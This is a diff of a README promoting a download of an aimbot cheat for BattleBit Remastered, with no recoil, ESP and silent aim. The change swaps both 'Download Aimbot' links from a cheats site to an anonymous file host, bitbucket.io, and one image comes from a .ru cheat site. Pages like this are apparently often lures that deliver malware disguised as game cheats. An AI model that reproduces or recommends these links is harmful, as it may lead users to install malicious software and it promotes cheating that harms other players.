@@ -6,7 +6,7 @@ BattleBit isn’t just chaos in voxels — it’s one of the most tactical low-p
 
 No more shaky aim or spraying like a bot. Just lock on and watch the killfeed light up.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/battlebit-remastered/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🎯 What Is BattleBit Aimbot?
@@ -15,7 +15,7 @@ Aimbot is a high-precision mod that makes your crosshair **instantly snap to ene
 
 ✅ Combine it with **No Recoil**, **ESP**, and **Silent Aim**, and it’s basically god mode with bullets.
 
-[![Download Aimbot](https://soa-cheats.ru/img/dullwavebattlebitremastered.png)](https://wecheaters.github.io/cheats/battlebit-remastered/)
+[![Download Aimbot](https://soa-cheats.ru/img/dullwavebattlebitremastered.png)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 💻 Key Features of the Aimbot
